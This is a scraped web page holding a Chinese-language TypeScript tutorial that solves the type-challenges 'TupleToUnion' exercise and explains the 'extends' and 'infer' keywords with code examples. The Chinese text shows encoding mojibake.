class="article-title" data-v-61fb5e44="">
            type-challengesï¼ˆtsç±»å‹ä½“æ“ï¼‰: 10 - å…ƒç»„è½¬åˆé›†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3702810892856808/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    fxss
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T15:13:53.000Z" title="Fri Jan 30 2026 15:13:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">10 - å…ƒç»„è½¬åˆé›†</h2>
<p>by Anthony Fu (@antfu) #ä¸­ç­‰ #infer #tuple #union</p>
<h3 data-id="heading-1">é¢˜ç›®</h3>
<p>å®ç°æ³›å‹<code>TupleToUnion&lt;T&gt;</code>ï¼Œå®ƒè¿”å›å…ƒç»„æ‰€æœ‰å€¼çš„åˆé›†ã€‚</p>
<p>ä¾‹å¦‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Arr</span> = [<span class="hljs-string">'1'</span>, <span class="hljs-string">'2'</span>, <span class="hljs-string">'3'</span>]

<span class="hljs-keyword">type</span> <span class="hljs-title class_">Test</span> = <span class="hljs-title class_">TupleToUnion</span>&lt;<span class="hljs-title class_">Arr</span>&gt; <span class="hljs-comment">// expected to be '1' | '2' | '3'</span>
</code></pre>
<blockquote>
<p>åœ¨ Github ä¸ŠæŸ¥çœ‹ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Ftsch.js.org%2F10%2Fzh-CN" target="_blank" title="https://tsch.js.org/10/zh-CN" ref="nofollow noopener noreferrer">tsch.js.org/10/zh-CN</a></p>
</blockquote>
<h3 data-id="heading-2">ä»£ç </h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">/* _____________ ä½ çš„ä»£ç  _____________ */</span>

<span class="hljs-keyword">type</span> <span class="hljs-title class_">TupleToUnion</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> [infer F, ...infer R] ? F | <span class="hljs-title class_">TupleToUnion</span>&lt;R&gt; : <span class="hljs-built_in">never</span>

</code></pre>
<p>å…³é”®è§£é‡Šï¼š</p>
<ul>
<li><code>T extends [infer F, ...infer R]</code> ç”¨äºåˆ¤æ–­å…ƒç»„æ˜¯å¦ä¸ºç©ºã€‚</li>
<li><code>F | TupleToUnion&lt;R&gt;</code> ç”¨äºé€’å½’å¤„ç†å…ƒç»„çš„å‰©ä½™éƒ¨åˆ†ã€‚</li>
<li><code>never</code> ç”¨äºå¤„ç†ç©ºå…ƒç»„çš„æƒ…å†µã€‚</li>
</ul>
<h3 data-id="heading-3">ç›¸å…³çŸ¥è¯†ç‚¹</h3>
<h4 data-id="heading-4"><code>extends</code></h4>




















<table><thead><tr><th>ä½¿ç”¨ç»´åº¦</th><th>æ ¸å¿ƒä½œç”¨</th><th>ç¤ºä¾‹åœºæ™¯</th></tr></thead><tbody><tr><td>ç±»å‹ç»´åº¦</td><td>åšç±»å‹çº¦æŸæˆ–æ¡ä»¶åˆ¤æ–­ï¼ˆç±»å‹ç¼–ç¨‹æ ¸å¿ƒï¼‰</td><td>é™å®šæ³›å‹èŒƒå›´ã€åˆ¤æ–­ç±»å‹æ˜¯å¦å…¼å®¹ã€æå–ç±»å‹ç‰‡æ®µ</td></tr><tr><td>è¯­æ³•ç»´åº¦</td><td>åšç»§æ‰¿ï¼ˆå¤ç”¨å·²æœ‰ç»“æ„ï¼‰</td><td>æ¥å£ç»§æ‰¿ã€ç±»ç»§æ‰¿</td></tr></tbody></table>
<h5 data-id="heading-5"><code>extends</code> åšç±»å‹çº¦æŸæˆ–æ¡ä»¶åˆ¤æ–­</h5>
<ol>
<li>æ³›å‹çº¦æŸï¼šé™å®šæ³›å‹çš„å–å€¼èŒƒå›´</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// çº¦æŸ T å¿…é¡»æ˜¯ã€Œæ‹¥æœ‰ length å±æ€§ã€çš„ç±»å‹ï¼ˆæ¯”å¦‚ string/æ•°ç»„ï¼‰</span>
<span class="hljs-keyword">function</span> getLength&lt;T <span class="hljs-keyword">extends</span> { <span class="hljs-attr">length</span>: <span class="hljs-built_in">number</span> }&gt;(<span class="hljs-attr">arg</span>: T): <span class="hljs-built_in">number</span> {
  <span class="hljs-keyword">return</span> arg.<span class="hljs-property">length</span>;
}

<span class="hljs-comment">// åˆæ³•è°ƒç”¨ï¼ˆç¬¦åˆçº¦æŸï¼‰</span>
<span class="hljs-title function_">getLength</span>(<span class="hljs-string">"hello"</span>); <span class="hljs-comment">// âœ… string æœ‰ lengthï¼Œè¿”å› 5</span>
<span class="hljs-title function_">getLength</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]); <span class="hljs-comment">// âœ… æ•°ç»„æœ‰ lengthï¼Œè¿”å› 3</span>

<span class="hljs-comment">// éæ³•è°ƒç”¨ï¼ˆè¶…å‡ºçº¦æŸï¼‰</span>
<span class="hljs-title function_">getLength</span>(<span class="hljs-number">123</span>); <span class="hljs-comment">// âŒ æŠ¥é”™ï¼šnumber æ²¡æœ‰ length å±æ€§</span>
</code></pre>
<ol start="2">
<li>æ¡ä»¶ç±»å‹ï¼šç±»å‹ç‰ˆ <strong>ä¸‰å…ƒè¿ç®—ç¬¦</strong></li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// åŸºç¡€ç¤ºä¾‹ï¼šåˆ¤æ–­ç±»å‹æ˜¯å¦ä¸ºå­—ç¬¦ä¸²</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">IsString</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span> ? <span class="hljs-literal">true</span> : <span class="hljs-literal">false</span>;

<span class="hljs-keyword">type</span> A = <span class="hljs-title class_">IsString</span>&lt;<span class="hljs-string">"test"</span>&gt;; <span class="hljs-comment">// trueï¼ˆç¬¦åˆï¼‰</span>
<span class="hljs-keyword">type</span> B = <span class="hljs-title class_">IsString</span>&lt;<span class="hljs-number">123</span>&gt;; <span class="hljs-comment">// falseï¼ˆä¸ç¬¦åˆï¼‰</span>
</code></pre>
<p>åˆ†å¸ƒå¼æ¡ä»¶ç±»å‹ï¼ˆè”åˆç±»å‹ä¸“ç”¨ï¼‰: å½“ <code>T</code> æ˜¯è”åˆç±»å‹æ—¶ï¼Œ<code>extends</code> ä¼šè‡ªåŠ¨æ‹†åˆ†è”åˆç±»å‹çš„æ¯ä¸ªæˆå‘˜ï¼Œé€ä¸ªåˆ¤æ–­åå†åˆå¹¶ç»“æœã€‚</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Union</span> = <span class="hljs-built_in">string</span> | <span class="hljs-built_in">number</span> | <span class="hljs-built_in">boolean</span>;

<span class="hljs-comment">// æ‹†åˆ†é€»è¾‘ï¼šstringâ†’stringï¼Œnumberâ†’neverï¼Œbooleanâ†’never â†’ åˆå¹¶ä¸º string</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">OnlyString</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span> ? T : <span class="hljs-built_in">never</span>;
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Result</span> = <span class="hljs-title class_">OnlyString</span>&lt;<span class="hljs-title class_">Union</span>&gt;; <span class="hljs-comment">// Result = string</span>
</code></pre>
<p>æ³¨æ„ï¼šåªæœ‰æ³›å‹å‚æ•°æ˜¯ è£¸ç±»å‹ï¼ˆæ²¡æœ‰è¢« []/{} åŒ…è£¹ï¼‰æ—¶ï¼Œæ‰ä¼šè§¦å‘åˆ†å¸ƒå¼åˆ¤æ–­ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// åŒ…è£¹åä¸è§¦å‘åˆ†å¸ƒå¼ï¼Œæ•´ä½“åˆ¤æ–­ [string|number] æ˜¯å¦å…¼å®¹ [string]</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">NoDist</span>&lt;T&gt; = [T] <span class="hljs-keyword">extends</span> [<span class="hljs-built_in">string</span>] ? T : <span class="hljs-built_in">never</span>;
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Result2</span> = <span class="hljs-title class_">NoDist</span>&lt;<span class="hljs-title class_">Union</span>&gt;; <span class="hljs-comment">// neverï¼ˆæ•´ä½“ä¸å…¼å®¹ï¼‰</span>
</code></pre>
<ol start="3">
<li>é…åˆ <code>infer</code>ï¼šæå–ç±»å‹ç‰‡æ®µï¼ˆé»„é‡‘ç»„åˆï¼‰</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// æå– Promise çš„è¿”å›å€¼ç±»å‹</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">UnwrapPromise</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Promise</span>&lt;infer V&gt; ? V : T;

<span class="hljs-keyword">type</span> C = <span class="hljs-title class_">UnwrapPromise</span>&lt;<span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span>&gt;&gt;; <span class="hljs-comment">// stringï¼ˆæå–æˆåŠŸï¼‰</span>
<span class="hljs-keyword">type</span> D = <span class="hljs-title class_">UnwrapPromise</span>&lt;<span class="hljs-built_in">number</span>&gt;; <span class="hljs-comment">// numberï¼ˆä¸æ»¡è¶³æ¡ä»¶ï¼Œè¿”å›åŸç±»å‹ï¼‰</span>
</code></pre>
<h5 data-id="heading-6"><code>extends</code> åšç»§æ‰¿ï¼ˆå¤ç”¨å·²æœ‰ç»“æ„ï¼‰</h5>
<ol>
<li>æ¥å£ç»§æ‰¿ï¼šå¤ç”¨ + æ‰©å±•å±æ€§</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// åŸºç¡€æ¥å£</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
}

<span class="hljs-comment">// ç»§æ‰¿ Userï¼Œå¹¶æ‰©å±•æ–°å±æ€§</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Admin</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">role</span>: <span class="hljs-string">"admin"</span> | <span class="hljs-string">"super_admin"</span>; <span class="hljs-comment">// æ–°å¢æƒé™å±æ€§</span>
}

<span class="hljs-comment">// å¿…é¡»åŒ…å«ç»§æ‰¿çš„ + æ‰©å±•çš„æ‰€æœ‰å±æ€§</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">admin</span>: <span class="hljs-title class_">Admin</span> = {
  <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>,
  <span class="hljs-attr">name</span>: <span class="hljs-string">"å¼ ä¸‰"</span>,
  <span class="hljs-attr">role</span>: <span class="hljs-string">"admin"</span>
};

<span class="hljs-comment">// å¤šæ¥å£ç»§æ‰¿</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">HasAge</span> { <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>; }
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">User</span>, <span class="hljs-title class_">HasAge</span> {
  <span class="hljs-attr">className</span>: <span class="hljs-built_in">string</span>; <span class="hljs-comment">// åŒæ—¶ç»§æ‰¿ User + HasAge</span>
}
</code></pre>
<ol start="2">
<li>ç±»ç»§æ‰¿ï¼šå¤ç”¨çˆ¶ç±»çš„å±æ€§ / æ–¹æ³•</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Parent</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  }
  <span class="hljs-title function_">sayHi</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hi, <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>);
  }
}

<span class="hljs-comment">// ç»§æ‰¿ Parent ç±»</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Child</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Parent</span> {
  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span>, age: <span class="hljs-built_in">number</span></span>) {
    <span class="hljs-variable language_">super</span>(name); <span class="hljs-comment">// å¿…é¡»è°ƒç”¨çˆ¶ç±»æ„é€ å‡½æ•°ï¼ˆåˆå§‹åŒ–çˆ¶ç±»å±æ€§ï¼‰</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
  }
  <span class="hljs-comment">// é‡å†™çˆ¶ç±»æ–¹æ³•</span>
  <span class="hljs-title function_">sayHi</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">super</span>.<span class="hljs-title function_">sayHi</span>(); <span class="hljs-comment">// è°ƒç”¨çˆ¶ç±»åŸæ–¹æ³•</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`I'm <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.age}</span> years old`</span>);
  }
}

<span class="hljs-keyword">const</span> child = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Child</span>(<span class="hljs-string">"æå››"</span>, <span class="hljs-number">10</span>);
child.<span class="hljs-title function_">sayHi</span>(); <span class="hljs-comment">// è¾“å‡ºï¼šHi, æå›› â†’ I'm 10 years old</span>
</code></pre>
<p>è¡¥å……ï¼šç±»å®ç°æ¥å£ç”¨ <code>implements</code>ï¼ˆä¸æ˜¯ <code>extends</code>ï¼‰</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// å®šä¹‰æ¥å£ï¼ˆå¥‘çº¦ï¼šè§„å®šå¿…é¡»æœ‰ idã€name å±æ€§ï¼Œä»¥åŠ greet æ–¹æ³•ï¼‰</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Person</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-title function_">greet</span>(): <span class="hljs-built_in">void</span>; <span class="hljs-comment">// ä»…å®šä¹‰æ–¹æ³•ç­¾åï¼Œæ— å®ç°</span>
}

<span class="hljs-comment">// ç±»å®ç°æ¥å£ï¼ˆå¿…é¡»ä¸¥æ ¼éµå®ˆå¥‘çº¦ï¼‰</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Employee</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Person</span> {
  <span class="hljs-comment">// å¿…é¡»å®ç°æ¥å£çš„æ‰€æœ‰å±æ€§</span>
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;

  <span class="hljs-comment">// æ„é€ å‡½æ•°åˆå§‹åŒ–å±æ€§</span>
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">id: <span class="hljs-built_in">number</span>, name: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span> = id;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  }

  <span class="hljs-comment">// å¿…é¡»å®ç°æ¥å£çš„ greet æ–¹æ³•ï¼ˆå…·ä½“å®ç°ç”±ç±»è‡ªå·±å®šä¹‰ï¼‰</span>
  <span class="hljs-title function_">greet</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hi, I'm <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>, ID: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.id}</span>`</span>);
  }
}

<span class="hljs-comment">// å®ä¾‹åŒ–ä½¿ç”¨</span>
<span class="hljs-keyword">const</span> emp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Employee</span>(<span class="hljs-number">1</span>, <span class="hljs-string">"å¼ ä¸‰"</span>);
emp.<span class="hljs-title function_">greet</span>(); <span class="hljs-comment">// è¾“å‡ºï¼šHi, I'm å¼ ä¸‰, ID: 1</span>


<span class="hljs-comment">// æ¥å£1ï¼šåŸºç¡€ä¿¡æ¯</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Identifiable</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-title function_">getId</span>(): <span class="hljs-built_in">number</span>;
}

<span class="hljs-comment">// æ¥å£2ï¼šå¯æ‰“å°</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Printable</span> {
  <span class="hljs-title function_">printInfo</span>(): <span class="hljs-built_in">void</span>;
}

<span class="hljs-comment">// ç±»åŒæ—¶å®ç°ä¸¤ä¸ªæ¥å£ï¼ˆå¿…é¡»å®ç°æ‰€æœ‰æ¥å£çš„æˆå‘˜ï¼‰</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Product</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Identifiable</span>, <span class="hljs-title class_">Printable</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>; <span class="hljs-comment">// ç±»å¯æ‰©å±•æ¥å£å¤–çš„å±æ€§</span>

  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">id: <span class="hljs-built_in">number</span>, name: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span> = id;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  }

  <span class="hljs-comment">// å®ç° Identifiable çš„æ–¹æ³•</span>
  <span class="hljs-title function_">getId</span>(): <span class="hljs-built_in">number</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">id</span>;
  }

  <span class="hljs-comment">// å®ç° Printable çš„æ–¹æ³•</span>
  <span class="hljs-title function_">printInfo</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Product: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>, ID: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.getId()}</span>`</span>);
  }
}

<span class="hljs-keyword">const</span> product = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>(<span class="hljs-number">100</span>, <span class="hljs-string">"æ‰‹æœº"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(product.<span class="hljs-title function_">getId</span>()); <span class="hljs-comment">// 100</span>
product.<span class="hljs-title function_">printInfo</span>(); <span class="hljs-comment">// Product: æ‰‹æœº, ID: 100</span>
</code></pre>
<h4 data-id="heading-7"><code>infer</code></h4>
<p><code>infer</code> æ˜¯ TypeScript åœ¨æ¡ä»¶ç±»å‹ä¸­æä¾›çš„å…³é”®å­—ï¼Œç”¨äºå£°æ˜ä¸€ä¸ª <strong>å¾…æ¨å¯¼çš„ç±»å‹å˜é‡</strong>ï¼ˆç±»ä¼¼ç»™ç±»å‹èµ·ä¸€ä¸ªä¸´æ—¶åå­—ï¼‰ï¼Œåªèƒ½åœ¨ <code>extends</code> å­å¥ä¸­ä½¿ç”¨ã€‚å®ƒçš„æ ¸å¿ƒä½œç”¨æ˜¯ï¼šä»å·²æœ‰ç±»å‹ä¸­æå– / æ¨å¯¼æˆ‘ä»¬éœ€è¦çš„éƒ¨åˆ†ï¼Œè€Œæ— éœ€æ‰‹åŠ¨ç¡¬ç¼–ç ç±»å‹ã€‚</p>
<p><code>infer</code> å¿…é¡»é…åˆæ¡ä»¶ç±»å‹ä½¿ç”¨ï¼Œè¯­æ³•ç»“æ„å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// åŸºç¡€ç»“æ„ï¼šæ¨å¯¼ T çš„ç±»å‹ä¸º Uï¼Œè‹¥èƒ½æ¨å¯¼åˆ™è¿”å› Uï¼Œå¦åˆ™è¿”å› never</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">InferType</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> infer U ? U : <span class="hljs-built_in">never</span>;

<span class="hljs-keyword">type</span> <span class="hljs-title class_">Example</span> = <span class="hljs-title class_">InferType</span>&lt;<span class="hljs-built_in">string</span>&gt;; <span class="hljs-comment">// Example ç±»å‹ä¸º string</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">Example2</span> = <span class="hljs-title class_">InferType</span>&lt;<span class="hljs-built_in">number</span>[]&gt;; <span class="hljs-comment">// Example2 ç±»å‹ä¸º number[]</span>
</code></pre>
<p>é«˜é¢‘ä½¿ç”¨åœºæ™¯:</p>
<h5 data-id="heading-8">1. æå–å‡½æ•°çš„è¿”å›å€¼ç±»å‹</h5>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// å®šä¹‰ç±»å‹å·¥å…·ï¼šæå–å‡½æ•°çš„è¿”å›å€¼ç±»å‹</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">GetReturnType</span>&lt;<span class="hljs-title class_">Fn</span>&gt; = <span class="hljs-title class_">Fn</span> <span class="hljs-keyword">extends</span> (...<span class="hljs-attr">args</span>: <span class="hljs-built_in">any</span>[]) =&gt; infer R ? R : <span class="hljs-built_in">never</span>;

<span class="hljs-comment">// æµ‹è¯•ç”¨å‡½æ•°</span>
<span class="hljs-keyword">const</span> add = (<span class="hljs-attr">a</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">b</span>: <span class="hljs-built_in">number</span>): <span class="hljs-function"><span class="hljs-params">number</span> =&gt;</span> a + b;
<span class="hljs-keyword">const</span> <span class="hljs-title function_">getUser</span> = (<span class="hljs-params"/>) =&gt; ({ <span class="hljs-attr">name</span>: <span class="hljs-string">"å¼ ä¸‰"</span>, <span class="hljs-attr">age</span>: <span class="hljs-number">20</span> });

<span class="hljs-comment">// ä½¿ç”¨ç±»å‹å·¥å…·</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">AddReturn</span> = <span class="hljs-title class_">GetReturnType</span>&lt;<span class="hljs-keyword">typeof</span> add&gt;; <span class="hljs-comment">// AddReturn ç±»å‹ä¸º number</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">UserReturn</span> = <span class="hljs-title class_">GetReturnType</span>&lt;<span class="hljs-keyword">typeof</span> getUser&gt;; <span class="hljs-comment">// UserReturn ç±»å‹ä¸º { name: string; age: number }</span>
</code></pre>
<h5 data-id="heading-9">2. æå–æ•°ç»„çš„å…ƒç´ ç±»å‹</h5>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// å®šä¹‰ç±»å‹å·¥å…·ï¼šæå–æ•°ç»„å…ƒç´ ç±»å‹</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">GetArrayItem</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> (infer <span class="hljs-title class_">Item</span>)[] ? <span class="hljs-title class_">Item</span> : <span class="hljs-built_in">never</span>;

<span class="hljs-comment">// æµ‹è¯•</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">NumberArray</span> = <span class="hljs-title class_">GetArrayItem</span>&lt;<span class="hljs-built_in">number</span>[]&gt;; <span class="hljs-comment">// NumberArray ç±»å‹ä¸º number</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">StringArray</span> = <span class="hljs-title class_">GetArrayItem</span>&lt;<span class="hljs-built_in">string</span>[]&gt;; <span class="hljs-comment">// StringArray ç±»å‹ä¸º string</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">MixedArray</span> = <span class="hljs-title class_">GetArrayItem</span>&lt;[<span class="hljs-built_in">string</span>, <span class="hljs-built_in">number</span>]&gt;; <span class="hljs-comment">// MixedArray ç±»å‹ä¸º string | number</span>
</code></pre>
